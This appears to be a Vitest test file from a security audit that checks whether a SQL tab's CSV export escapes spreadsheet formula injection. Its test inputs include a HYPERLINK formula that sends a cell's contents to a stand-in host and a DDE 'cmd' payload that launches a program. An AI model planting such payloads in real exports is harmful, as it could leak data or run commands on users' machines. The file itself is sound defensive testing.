// The SQL tab's CSV export (exportResults.js toCSV) never leaves a live
// spreadsheet formula (audit SEC-48). Anyone may file an error report, and a
// super admin may query error_events and export it: "-1+HYPERLINK(...)" and
// "+1+cmd|..." started with a signed number and stayed formulas. From the
// audit's src/__audit__/webhardening-sqlCsv.test.js.
import { describe, it, expect } from 'vitest'
import { toCSV } from '../exportResults'

const cells = (values) => toCSV(['message'], values.map((v) => [v])).split('\n').slice(1)

describe('SQL CSV export: formula escaping', () => {
  it('a formula behind a signed number is escaped too', () => {
    const [plain, link, dde, minusAt] = cells([
      '=HYPERLINK("https://x.example","a")',
      '-1+HYPERLINK("https://x.example/?"&A3,"open")',
      "+1+cmd|' /C calc'!A0",
      '-2@x'
    ])
    expect(plain.startsWith('"\'=')).toBe(true)
    expect(link.startsWith('"\'-1+HYPERLINK')).toBe(true)
    expect(dde.startsWith("'+1+cmd|")).toBe(true)
    expect(minusAt).toBe("'-2@x")
  })

  it('every leading = + - @ tab or CR is escaped', () => {
    expect(cells(['@SUM(A1)', '\tx', '+', '-', '=1'])).toEqual(["'@SUM(A1)", "'\tx", "'+", "'-", "'=1"])
    expect(cells(['\rx'])[0]).toBe('"\'\rx"')
  })

  it('a whole-cell plain number stays a number', () => {
    expect(cells(['-2.5', '+3', '-5', '1e-3', '-1.5E+10', '-.5', '42'])).toEqual(['-2.5', '+3', '-5', '1e-3', '-1.5E+10', '-.5', '42'])
    expect(toCSV(['n'], [[-5], [-0.25]])).toBe('n\n-5\n-0.25')
  })
})
